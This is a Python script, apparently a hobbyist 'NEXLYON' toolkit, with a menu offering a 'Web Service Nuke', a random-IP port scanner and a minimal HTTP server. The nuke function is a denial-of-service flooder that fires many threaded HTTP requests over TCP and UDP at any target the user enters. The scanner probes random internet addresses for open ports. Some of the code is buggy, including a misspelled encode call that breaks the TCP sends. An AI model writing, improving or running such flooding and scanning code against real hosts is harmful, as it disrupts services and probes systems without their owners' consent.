#!/usr/bin/python3
import socket, threading, random, os, time
byte = 0
cc = 0
l = threading.Lock()
ts = []
nn = 1
find = ""
def servicesend(target, port, method, path):
	global byte, cc
	try:
		tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		tcp.connect((target, port))
		pack = f"{method} {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: bot\r\nContent-Type: text/html\r\nContent-Length: 0\r\n\r\n"
		udp.sendto(pack.encode(), (target, port))
		with l:
			byte += len(pack)
			cc += 1
		tcp.sendall(pack.ecnode())
		with l:
			byte += len(pack)
			cc += 1
		udp.close()
		tcp.close()
	except:
		pass
def servicenuke(target, port):
	global ts
	for _ in range(4):
		t = threading.Thread(target=servicesend, args=(target, port, "GET", "/"))
		t.start()
		ts.append(t)
		t = threading.Thread(target=servicesend, args=(target, port, "GET", "/favicon.ico"))
		t.start()
		ts.append(t)
		path = "/"+str(random.randint(1000000, 9999999))
		t = threading.Thread(target=servicesend, args=(target, port, "POST", path))
		t.start()
		ts.append(t)
		path = "/"+str(random.randint(1000000, 9999999))
		t = threading.Thread(target=servicesend, args=(target, port, "PUT", path))
		t.start()
		ts.append(t)
		t = threading.Thread(target=servicesend, args=(target, port, "DELETE", "/"))
		t.start()
		ts.append(t)
		t = threading.Thread(target=servicesend, args=(target, port, "HEAD", "/"))
		t.start()
		ts.append(t)
		t = threading.Thread(target=servicesend, args=(target, port, "OPTIONS", "/"))
		t.start()
		ts.append(t)
		t = threading.Thread(target=servicesend, args=(target, port, "PACTH", "/"))
		t.start()
		ts.append(t)
def choc(text):
	global nn
	print(f"\033[92m[\033[93m {nn} \033[92m] \033[93m{text.upper()}\033[0m")
	nn += 1
def portscan(target, port):
	global find
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(0.8)
		test = s.connect_ex((target, port))
		s.close()
		if test == 0:
			find = target
	except:
		pass
def iana():
	return str(random.randint(1, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))
def findserver(port):
	global find
	find = ""
	while True:
		if find == "":
			pass
		else:
			break
		target = iana()
		threading.Thread(target=portscan, args=(target, port)).start()
		if find == "":
			pass
		else:
			break
	print(f"Sucessfuly!\nServer: {find}")
	return target
def server(ip, port):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind((ip, port))
		s.listen(99999999)
		paths = {"/": ""}
		print("Only Methods: GET, POST, DELETE")
		print(f"TCP Server Started {ip}:{port}\nListening...\n")
		while True:
			c, a = s.accept()
			print(f"Connect: {a}")
			r = c.recv(100000).decode()
			print(f"\033[92m{r}\033[0m")
			try:
				method = r.split()[0]
				path = r.split()[1]
			except:
				method = "GET"
				path = "/"
			if method == "GET":
				try:
					c.send(f"HTTP/1.1 200 OK\r\nServer: NEXLYON\r\nContent-Type: text/html\r\nContent-Length: {len(paths[path])}\r\n\r\n{paths[path]}".encode())
				except:
					c.send(f"HTTP/1.1 404 NOT FOUND\r\nServer: NEXLYON\r\n\r\n".encode())
			elif method == "POST":
				try:
					c.send(f"HTTP/1.1 200 OK\r\nServer: NEXLYON\r\n\r\n".encode())
					paths[path] = r[r.find("\r\n\r\n"):len(r)]
				except:
					c.send(f"HTTP/1.1 403 FORBIDDEN\r\nServer: NEXLYON\r\n\r\n".encode())
			elif method == "DELETE":
				try:
					c.send(f"HTTP/1.1 200 OK\r\nServer: NEXLYON\r\n\r\n".encode())
					del paths[path]
				except:
					c.send(f"HTTP/1.1 403 FORBIDDEN\r\nServer: NEXLYON\r\n\r\n".encode())
			else:
				c.send("".encode())
			c.close()
	except:
		print("SERVER ERROR :(")
		try:
			s.close()
		except:
			pass
def ff(s1, s2):
	return (s1/s2)*100
def menu():
	global ts, byte, cc, nn
	nn = 1
	os.system("clear")
	print("""\033[92m_   _ _______  ___  __   _____  _   _
| \ | | ____\ \/ / | \ \ / / _ \| \ | |
|  \| |  _|  \  /| |  \ V / | | |  \| |
| |\  | |___ /  \| |___| || |_| | |\  |
|_| \_|_____/_/\_\_____|_| \___/|_| \_|\n\033[93mby \033[96maertsimon90 #0000 \033[93m(Discord)\033[0m\n""")
	choc("Web Service Nuke")
	choc("HTTP Server Finder")
	choc("HTTP Server Creator (only tcp)")
	print()
	choc("Exit")
	print()
	choice = input("\033[93m~ \033[92m$ ")
	c = choice[0]
	if c == "1":
		target = input("\n\033[0mTarget: ")
		port = int(input("Port: "))
		num = int(input("Nuke Count (Standart=4): "))
		print("Started...")
		for n in range(num):
			t = threading.Thread(target=servicenuke, args=(target, port))
			t.start()
			ts.append(t)
			yy = ff(n+1, num)
			print(f"Starting Threads... {yy}%")
		time.sleep(1)
		print("Joining Threads...")
		for t in ts:
			print(f"All Packets Size: {byte/1024/1024} MB")
			print(f"All Packets Count: {cc}")
			t.join()
			print(f"All Packets Size: {byte/1024/1024} MB")
			print(f"All Packets Count: {cc}")
		print()
		print(f"All Packets Size: {byte/1024/1024} MB")
		print(f"All Packets Count: {cc}")
		enter = input("\n[ Enter to menu ]")
	elif c == "2":
		port = int(input("\033[0m\nPort: "))
		print("Started Searching...")
		findserver(port)
		enter = input("\n[ Enter to menu ]")
	elif c == "3":
		ip = input("\033[0m\nIP: ")
		port = int(input("PORT: "))
		print()
		server(ip, port)
		enter = input("\n[ Enter to menu ]")
	elif c == "4":
		return True
while True:
	try:
		r = menu()
		if r == True:
			break
	except:
		pass
